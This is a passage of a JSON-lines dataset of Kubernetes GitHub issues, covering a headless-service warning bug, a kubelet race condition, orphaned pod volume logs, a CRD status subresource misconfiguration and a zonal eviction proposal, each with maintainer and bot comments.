know?\n\nThe change seems to be introduced by https://github.com/kubernetes/kubernetes/pull/132214\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\nClient Version: v1.34.1\nKustomize Version: v5.7.1\nServer Version: v1.34.0\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\nkind\n</details>\n\n\n### OS version\n\n<details>\n\n```console\nNAME=\"Fedora Linux\"\nVERSION=\"42 (Workstation Edition)\"\nRELEASE_TYPE=stable\nID=fedora\nVERSION_ID=42\nVERSION_CODENAME=\"\"\nPLATFORM_ID=\"platform:f42\"\nPRETTY_NAME=\"Fedora Linux 42 (Workstation Edition)\"\nANSI_COLOR=\"0;38;2;60;110;180\"\nLOGO=fedora-logo-icon\nCPE_NAME=\"cpe:/o:fedoraproject:fedora:42\"\nDEFAULT_HOSTNAME=\"fedora\"\nHOME_URL=\"https://fedoraproject.org/\"\nDOCUMENTATION_URL=\"https://docs.fedoraproject.org/en-US/fedora/f42/\"\nSUPPORT_URL=\"https://ask.fedoraproject.org/\"\nBUG_REPORT_URL=\"https://bugzilla.redhat.com/\"\nREDHAT_BUGZILLA_PRODUCT=\"Fedora\"\nREDHAT_BUGZILLA_PRODUCT_VERSION=42\nREDHAT_SUPPORT_PRODUCT=\"Fedora\"\nREDHAT_SUPPORT_PRODUCT_VERSION=42\nSUPPORT_END=2026-05-13\nVARIANT=\"Workstation Edition\"\nVARIANT_ID=workstation\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/network", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "rxinui", "body": "Hi, I'm not sure to understand the purpose of removing the warning. Is it noise to the end-user or non-sense?"}, {"author": "simonpasquier", "body": "if I understand correctly, it's non-sense because as shown in the example, the warning gets printed even though the headless service doesn't define any session affinity value."}, {"author": "rxinui", "body": "I see. I think this is triggered by the fact that `clusterIP: None` is enabled.\n\nI guess this is a general warning."}, {"author": "Peac36", "body": "@simonpasquier  - thanks for reporting this. It's indeed a bug in my implementation.  The warning is printed whenever `SessionAffinity` is not an empty string or not provided in resource data - https://github.com/kubernetes/kubernetes/blob/43706d6b7a89cde01089a360a0e6547691308cf8/pkg/api/service/warnings.go#L51\n\nHowever, I've just realized that this field has a default value that is used every time the `SessionAffinity` is not specified -  https://github.com/kubernetes/kubernetes/blob/845e94d37075d199cd3cc23ac05f05a95e2c15b8/pkg/apis/core/v1/defaults.go#L107-L109\n\nThis means that we'll print this warning whenever a headless service is created or updated, which is wrong. \nI'll prepare a fix for that that will print this error only when sessionAffinity is `ClientIP`"}, {"author": "rxinui", "body": "@Peac36 I was preparing a quick fix locally but better have it from the original commiter \ud83d\udc4d \n\nI reckon this falls under sig-apps @soltysh "}, {"author": "Peac36", "body": "/assign"}, {"author": "soltysh", "body": "> I reckon this falls under sig-apps [@soltysh](https://github.com/soltysh)\n\nServices fall under sig-network, so marking accordingly.\n/sig network "}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133501, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133501", "issue_title": "Race condition in kubelet's PodCertsManager might lead to memory leaks", "issue_author": "stlaz", "issue_body": "### What happened?\n\nIntroduced in https://github.com/kubernetes/kubernetes/commit/4624cb9bb92186358e001be392e50e5d23b5cdd9, and only observable after enabling the `PodCertificateRequest` feature gate.\n\nWhen https://github.com/kubernetes/kubernetes/blob/790393ae92e97262827d4f1fba24e8ae65bbada0/pkg/kubelet/kubelet.go#L2825 gets called, it queues PCRs for a given pod to be handled by a `podcertificate.Manager` instance.\n\nHowever, if the queue keys for these PCRs get async-processed before https://github.com/kubernetes/kubernetes/blob/790393ae92e97262827d4f1fba24e8ae65bbada0/pkg/kubelet/kubelet.go#L2826 is called, the `podcertificate.Manager` will never again attempt to clear its internal state for these PCRs as kept in its `Manager.credStore` map.\n\n### What did you expect to happen?\n\nKubelet's state gets cleaned for a given pod when the pod is removed.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nWrite a unit test that runs https://github.com/kubernetes/kubernetes/blob/790393ae92e97262827d4f1fba24e8ae65bbada0/pkg/kubelet/kubelet.go#L2822, expose the `podcertificate.Manager{}.credStore` variable, and observe what happens to the `credStore` variable when a cached PCR's state is supposed to get removed. Run a couple hundred times to make sure the race condition appears.\n\n### Anything else we need to know?\n\nDiscussed at https://kubernetes.slack.com/archives/C05MW3382US/p1754992465556979\n\n### Kubernetes version\n\n<details>\n1.34.0\n</details>\n\n\n### Cloud provider\n\n<details>\nany\n</details>\n\n\n### OS version\n\n\n\n\n### Install tools\n\n_No response_\n\n### Container runtime (CRI) and version (if applicable)\n\n_No response_\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n_No response_", "issue_labels": ["kind/bug", "sig/node", "sig/auth", "priority/important-longterm", "triage/accepted"], "comments": [{"author": "stlaz", "body": "/sig node\n/sig auth"}, {"author": "stlaz", "body": "/cc @ahmedtd "}, {"author": "natasha41575", "body": "/triage accepted\n/priority important-longterm"}, {"author": "PersistentJZH", "body": "/assign"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134075, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134075", "issue_title": "Orphaned pod \"0008e5b2-6008-45b9-89cd-1aa60f896e24\" found, but volume paths are still present on disk", "issue_author": "lusicong", "issue_body": "### What happened?\n\nSep 16 08:27:42 k8s-worker-63 kubelet[2588]: E0916 08:27:42.356361    2588 kubelet_volumes.go:154] Orphaned pod \"0008e5b2-6008-45b9-89cd-1aa60f896e24\" found, but volume paths are still present on disk : There were a total of 8549 errors similar to this. Turn up verbosity to see them.\nSep 16 08:27:44 k8s-worker-63 kubelet[2588]: E0916 08:27:44.384160    2588 kubelet_volumes.go:154] Orphaned pod \"0008e5b2-6008-45b9-89cd-1aa60f896e24\" found, but volume paths are still present on disk : There were a total of 8549 errors similar to this. Turn up verbosity to see them.\nSep 16 08:27:46 k8s-worker-63 kubelet[2588]: E0916 08:27:46.358832    2588 kubelet_volumes.go:154] Orphaned pod \"0008e5b2-6008-45b9-89cd-1aa60f896e24\" found, but volume paths are still present on disk : There were a total of 8549 errors similar to this. Turn up verbosity to see them.\nSep 16 08:27:46 k8s-worker-63 kubelet[2588]: E0916 08:27:46.683320    2588 pod_workers.go:190] Error syncing pod da3ca68c-78d6-4c9f-ac3d-ef946afcbfa1 (\"skgxfw-api-dmkyanshi-7bdf8f5788-2kggj_skgx(da3ca68c-78d6-4c9f-ac3d-ef946afcbfa1)\"), skipping: failed to \"StartContainer\" for \"skgxfw-api-dmkyanshi\" with ImagePullBackOff: \"Back-off pulling image \\\"reg.cx.htjs.net/cx.ci.v3/htjs/skgx.skgxfw-api.master-dmkyanshi:aoneci-d030a42e-20230426180948\\\"\"\nSep 16 08:27:48 k8s-worker-63 kubelet[2588]: E0916 08:27:48.352049    2588 kubelet_volumes.go:154] Orphaned pod \"0008e5b2-6008-45b9-89cd-1aa60f896e24\" found, but volume paths are still present on disk : There were a total of 8549 errors similar to this. Turn up verbosity to see them.\nSep 16 08:27:50 k8s-worker-63 kubelet[2588]: E0916 08:27:50.416639    2588 kubelet_volumes.go:154] Orphaned pod \"0008e5b2-6008-45b9-89cd-1aa60f896e24\" found, but volume paths are still present on disk : There were a total of 8549 errors similar to this. Turn up verbosity to see them.\nSep 16 08:27:51 k8s-worker-63 kubelet[2588]: W0916 08:27:51.040371    2588 watcher.go:87] Error while processing event (\"/sys/fs/cgroup/memory/libcontainer_8684_systemd_test_default.slice\": 0x40000100 == IN_CREATE|IN_ISDIR): readdirent: no such file or directory\nSep 16 08:27:51 k8s-worker-63 kubelet[2588]: W0916 08:27:51.040474    2588 watcher.go:87] Error while processing event (\"/sys/fs/cgroup/devices/libcontainer_8684_systemd_test_default.slice\": 0x40000100 == IN_CREATE|IN_ISDIR): open /sys/fs/cgroup/devices/libcontainer_8684_systemd_test_default.slice: no such file or directory\nSep 16 08:27:52 k8s-worker-63 kubelet[2588]: E0916 08:27:52.351770    2588 kubelet_volumes.go:154] Orphaned pod \"0008e5b2-6008-45b9-89cd-1aa60f896e24\" found, but volume paths are still present on disk : There were a total of 8549 errors similar to this. Turn up verbosity to see them.\nSep 16 08:27:54 k8s-worker-63 kubelet[2588]: E0916 08:27:54.351288    2588 kubelet_volumes.go:154] Orphaned pod \"0008e5b2-6008-45b9-89cd-1aa60f896e24\" found, but volume paths are still present on disk : There were a total of 8549 errors similar to this. Turn up verbosity to see them.\nSep 16 08:27:56 k8s-worker-63 kubelet[2588]: E0916 08:27:56.387789    2588 kubelet_volumes.go:154] Orphaned pod \"0008e5b2-6008-45b9-89cd-1aa60f896e24\" found, but volume paths are still present on disk : There were a total of 8549 errors similar to this. Turn up verbosity to see them.\nSep 16 08:27:58 k8s-worker-63 kubelet[2588]: E0916 08:27:58.431012    2588 kubelet_volumes.go:154] Orphaned pod \"0008e5b2-6008-45b9-89cd-1aa60f896e24\" found, but volume paths are still present on disk : There were a total of 8549 errors similar to this. Turn up verbosity to see them.\nSep 16 08:28:00 k8s-worker-63 kubelet[2588]: E0916 08:28:00.393694    2588 kubelet_volumes.go:154] Orphaned pod \"0008e5b2-6008-45b9-89cd-1aa60f896e24\" found, but volume paths are still present on disk : There were a total of 8549 errors similar to this. Turn up verbosity to see them.\nSep 16 08:28:00 k8s-worker-63 kubelet[2588]: E0916 08:28:00.396466    2588 pod_workers.go:190] Error syncing pod da3ca68c-78d6-4c9f-ac3d-ef946afcbfa1 (\"skgxfw-api-dmkyanshi-7bdf8f5788-2kggj_skgx(da3ca68c-78d6-4c9f-ac3d-ef946afcbfa1)\"), skipping: failed to \"StartContainer\" for \"skgxfw-api-dmkyanshi\" with ImagePullBackOff: \"Back-off pulling image \\\"reg.cx.htjs.net/cx.ci.v3/htjs/skgx.skgxfw-api.master-dmkyanshi:aoneci-d030a42e-20230426180948\\\"\"\nSep 16 08:28:02 k8s-worker-63 kubelet[2588]: E0916 08:28:02.451598    2588 kubelet_volumes.go:154] Orphaned pod \"0008e5b2-6008-45b9-89cd-1aa60f896e24\" found, but volume paths are still present on disk : There were a total of 8549 errors similar to this. Turn up verbosity to see them.\nSep 16 08:28:04 k8s-worker-63 kubelet[2588]: E0916 08:28:04.320962    2588 kubelet_volumes.go:154] Orphaned pod \"0008e5b2-6008-45b9-89cd-1aa60f896e24\" found, but volume paths are still present on disk : There were a total of 8549 errors similar to this. Turn up verbosity to see them.\n\n[root@k8s-worker-63 ~]# top -H -p $(pgrep kubelet)\ntop - 09:19:04 up 167 days, 11:17,  1 user,  load average: 6.85, 6.92, 7.57\nThreads: 4174 total,   0 running, 4174 sleeping,   0 stopped,   0 zombie\n%Cpu(s): 16.7 us, 12.6 sy,  0.0 ni, 70.2 id,  0.0 wa,  0.0 hi,  0.5 si,  0.0 st\nKiB Mem : 98832040 total, 10291200 free, 50149632 used, 38391208 buff/cache\nKiB Swap:        0 total,        0 free,        0 used. 48007636 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                                                                                                 \n23580 root      20   0   49.3g 646664  25152 S 41.7  0.7   4325:33 kubelet                                                                                                 \n30183 root      20   0   49.3g 646664  25152 S 25.0  0.7   4385:05 kubelet                                                                                                 \n 2964 root      20   0   49.3g 646664  25152 S 16.7  0.7   4359:16 kubelet                                                                                                 \n 2716 root      20   0   49.3g 646664  25152 S  8.3  0.7   4362:35 kubelet                                                                                                 \n24464 root      20   0   49.3g 646664  25152 S  8.3  0.7   4212:36 kubelet                                                                                                 \n19889 root      20   0   49.3g 646664  25152 S  8.3  0.7   4317:16 kubelet                                                                                                 \n23467 root      20   0   49.3g 646664  25152 S  8.3  0.7   4375:05 kubelet                                                                                                 \n 2590 root      20   0   49.3g 646664  25152 S  4.2  0.7   4593:39 kubelet                                                                                                 \n 2591 root      20   0   49.3g 646664  25152 S  4.2  0.7   4480:34 kubelet                                                                                                 \n 2599 root      20   0   49.3g 646664  25152 S  4.2  0.7   4484:10 kubelet                                                                                                 \n 2600 root      20   0   49.3g 646664  25152 S  4.2  0.7 390:12.73 kubelet                                                                                                 \n 2648 root      20   0   49.3g 646664  25152 S  4.2  0.7   4495:24 kubelet                                                                                                 \n 2650 root      20   0   49.3g 646664  25152 S  4.2  0.7   4330:59 kubelet                                                                                                 \n 2658 root      20   0   49.3g 646664  25152 S  4.2  0.7   4433:50 kubelet                                                                                                 \n 2682 root      20   0   49.3g 646664  25152 S  4.2  0.7   3175:50 kubelet                                                                                                 \n 2684 root      20   0   49.3g 646664  25152 S  4.2  0.7   4399:47 kubelet                                                                                                 \n 2700 root      20   0   49.3g 646664  25152 S  4.2  0.7   4421:49 kubelet                                                                                                 \n 2706 root      20   0   49.3g 646664  25152 S  4.2  0.7   4454:04 kubelet                                                                                                 \n 2730 root      20   0   49.3g 646664  25152 S  4.2  0.7   4361:04 kubelet                                                                                                 \n 2731 root      20   0   49.3g 646664  25152 S  4.2  0.7   4443:04 kubelet                                                                                                 \n 2958 root      20   0   49.3g 646664  25152 S  4.2  0.7 684:00.07 kubelet                                                                                                 \n17161 root      20   0   49.3g 646664  25152 S  4.2  0.7 508:53.39 kubelet                                                                                                 \n18365 root      20   0   49.3g 646664  25152 S  4.2  0.7   4347:23 kubelet                                                                                                 \n32098 root      20   0   49.3g 646664  25152 S  4.2  0.7   4412:05 kubelet                                                                                                 \n 4087 root      20   0   49.3g 646664  25152 S  4.2  0.7   4357:41 kubelet\n\n\n\n[root@k8s-worker-63 ~]# cat /proc/2730/task/*/stack | grep futex_wait | wc -l\n8314\n[root@k8s-worker-63 ~]# cat /proc/2730/task/2658/stack\n[<ffffffff855121f6>] futex_wait_queue_me+0xc6/0x130\n[<ffffffff85512f9b>] futex_wait+0x17b/0x280\n[<ffffffff85514d06>] do_futex+0x106/0x5a0\n[<ffffffff85515220>] SyS_futex+0x80/0x190\n[<ffffffff85b93f92>] system_call_fastpath+0x25/0x2a\n[<ffffffffffffffff>] 0xffffffffffffffff\n[root@k8s-worker-63 ~]# cat /proc/2730/task/*/stack | grep futex_wait | wc -l\n8334\n[root@k8s-worker-63 ~]# cat /proc/2730/task/23580/stack\n[<ffffffff855121f6>] futex_wait_queue_me+0xc6/0x130\n[<ffffffff85512f9b>] futex_wait+0x17b/0x280\n[<ffffffff85514d06>] do_futex+0x106/0x5a0\n[<ffffffff85515220>] SyS_futex+0x80/0x190\n[<ffffffff85b93f92>] system_call_fastpath+0x25/0x2a\n[<ffffffffffffffff>] 0xffffffffffffffff\n\n\n\n\n### What did you expect to happen?\n\nwhy this happen\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nthreads blocked. how I avoid this problem.\n\n\n\n### Anything else we need to know?\n\nk8s version 1.15.4\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\n# paste output here\n```\n\nClient Version: version.Info{Major:\"1\", Minor:\"15\", GitVersion:\"v1.15.4\", GitCommit:\"67d2fcf276fcd9cf743ad4be9a9ef5828adc082f\", GitTreeState:\"clean\", BuildDate:\"2019-09-18T14:51:13Z\", GoVersion:\"go1.12.9\", Compiler:\"gc\", Platform:\"linux/amd64\"}\n\n\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "kind/support", "needs-sig", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "There are no sig labels on this issue. Please add an appropriate label by using one of the following commands:\n- `/sig <group-name>`\n- `/wg <group-name>`\n- `/committee <group-name>`\n\nPlease see the [group list](https://git.k8s.io/community/sig-list.md) for a listing of the SIGs, working groups, and committees available.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "pacoxu", "body": "> k8s version 1.15.4\n\n1.15 is too old which was end of life years ago. https://endoflife.date/kubernetes.\n\n/kind support\n\nDoes this still appear in kubernets v1.31 +? \n "}, {"author": "lusicong", "body": "> Does this still appear in kubernets v1.31 +?\n\n\nno\n\n"}, {"author": "pacoxu", "body": "BTW, it looks to be the same issue as https://github.com/kubernetes/kubernetes/issues/60987."}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134016, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134016", "issue_title": "Status().Update() returns \"not found\" for existing custom resource with matching resource version", "issue_author": "jdiuwe", "issue_body": "### What happened?\n\nWhen updating the status subresource of a custom resource using client.Status().Update(), the operation fails with a \"not found\" error even though:\n\n1. The custom resource definitively exists in the cluster\n2. The resource versions match exactly between our object and the cluster state\n3. The status subresource is properly configured with +kubebuilder:subresource:status\n4. Regular (non-status) updates to the same resource work correctly\n\n### What did you expect to happen?\n\nThe status update should succeed when the resource exists and resource versions match.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nThis occurs intermittently in a controller-runtime based operator during status updates after successful reconciliation. The issue appears to be a race condition between the main resource and its status subresource.\n\nDetailed evidence from logs:\n```\nlevel=info msg=\"attempting status update\" \n  resource_version=774328992 phase=Ready\n\nlevel=info msg=\"CR exists, checking resource versions\" \n  current_rv=774328992 updating_rv=774328992 rv_matches=true\n\nlevel=error msg=\"status update failed\" \n  error=\"orchestrators.sms-operator.alluvial.finance \\\"sms-0-orch-0\\\" not found\"\n\nlevel=error msg=\"CR STILL EXISTS after 'not found' status update error\" \n  confirm_rv=774328992 confirm_uid=2f2618e7-fafa-4683-aaa7-553741d52a05\n```\n\n**Analysis**\n\n1. Pre-update verification: client.Get() confirms resource exists with RV 774328992\n2. Resource version sync: Our object has identical resource version 774328992\n3. Status update fails: Returns \"not found\" despite matching resource versions\n4. Post-error confirmation: client.Get() immediately after failure confirms resource still exists with same RV and UID\n\nThis suggests an internal inconsistency in the API server between the main resource and status subresource endpoints.\n\n**Environment**\n\n- Kubernetes version: \n- Kubernetes cluster version: v1.32.8-eks-e386d34 (Amazon EKS)\n- controller-runtime version: v0.22.1\n- Kubernetes API client libraries: v0.34.1\n- kubectl version: v1.32.2\n- Custom Resource: Uses status subresource with proper _+kubebuilder:subresource:status_ marker\n- Frequency: Intermittent but reproducible under normal controller operation\n\n**Impact**\n\n- Controllers must implement complex retry mechanisms for status updates\n- Status-dependent functionality becomes unreliable\n- Workarounds require using annotations instead of the proper status subresource\n\n**Workaround**\n\n- Currently using annotations instead of status subresource to track critical state, which bypasses this issue but defeats the purpose of the status subresource design.\n- Additional context\n- This appears to be a race condition or consistency issue specifically with status subresources. The main resource CRUD operations work reliably, but the status subresource exhibits this phantom \"not found\" behavior despite the resource being continuously accessible via the main endpoint.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\nClient Version: v1.32.2\nKustomize Version: v5.5.0\nServer Version: v1.32.8-eks-e386d34\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\nAWS\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/api-machinery", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "pacoxu", "body": "/sig api-machinery"}, {"author": "aojea", "body": "do you know if this can be related to controller runtime itself or to client-go/apimachinery?\n\nif the former this has to be open in https://github.com/kubernetes-sigs/controller-runtime\n\npinging @sbueringer and @alvaroaleman for visibility and helping triaging"}, {"author": "alvaroaleman", "body": "What do you get from \n\n`kubectl get --raw /apis/sms-operator.alluvial.finance/$your_api_version/namespaces/$your_namespaces/orchestrators/sms-0-orch-0/status` ?\n\nSimilar what does `kubectl get crd orchestrators.sms-operator.alluvial.finance -ojson| jq '.spec.versions[0].subresources'` return?\n"}, {"author": "sbueringer", "body": "Usually when I saw this in the past there was some issue that the status subresource wasn't configured in the CRD. I would recommend double-checking the CRD as well (not sure if checking the version version is enough: https://github.com/kubernetes/kubernetes/issues/134016#issuecomment-3291815901)"}, {"author": "jdiuwe", "body": "Looks like we were missing status subresource in CRD even though we had the right annotation in our code (`+kubebuilder:subresource:status`).\n\nDeploying the latest version of CRD solved the issue. Thank you both for help.\n\n```\n\u276f kubectl get crd orchestrators.sms-operator.alluvial.finance -o jsonpath='{.spec.versions[*].subresources}'\n{\"status\":{}}%\n\u276f\n\u276f\n\u276f kubectl get crd orchestrators.sms-operator.alluvial.finance -ojson| jq '.spec.versions[0].subresources'\n{\n  \"status\": {}\n}\n\n~                                                                                                                                                                                                                                         15:23:53\n\u276f\n```"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 131314, "issue_url": "https://github.com/kubernetes/kubernetes/issues/131314", "issue_title": "Should pause pod evictions when zone is in Full Zonal Disruption", "issue_author": "sumukha-radhakrishna", "issue_body": "### What happened?\n\nWhen all nodes in an AZ goes down then the zone is in Full Zonal Disruption during which we set the eviction ratelimiter to `HealthyQPSFunc`. Where as if a zone is experiencing PartialZonalDisruption then we stop all pod evictions by setting the rate limiter to `ReducedQPSFunc`.\n\nAll workloads in a zone gets evicted during FullZonalDisruption. I understand the idea to evict pods in a zone where we are not able to allocate/provision more capacity since its down. \n\n\n\n### What did you expect to happen?\n\nWe expect to pause all pod evictions during FullZonalDisruption and set the rate limiter to `ReducedQPSFunc`.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nCreate a kubernetes cluster and mimic the scenario where all nodes in an AZ goes down causing the zone to be in FullZonalDisruption, KCM will start evicting pods.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\nAll Kubernetes version\n\n</details>\n\n\n### Cloud provider\n\n<details>\n\nAll Cloud Providers\n\n</details>\n\n\n### OS version\n\n<details>\n\nNA\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "needs-sig", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "There are no sig labels on this issue. Please add an appropriate label by using one of the following commands:\n- `/sig <group-name>`\n- `/wg <group-name>`\n- `/committee <group-name>`\n\nPlease see the [group list](https://git.k8s.io/community/sig-list.md) for a listing of the SIGs, working groups, and committees available.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131314#issuecomment-3289985740):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
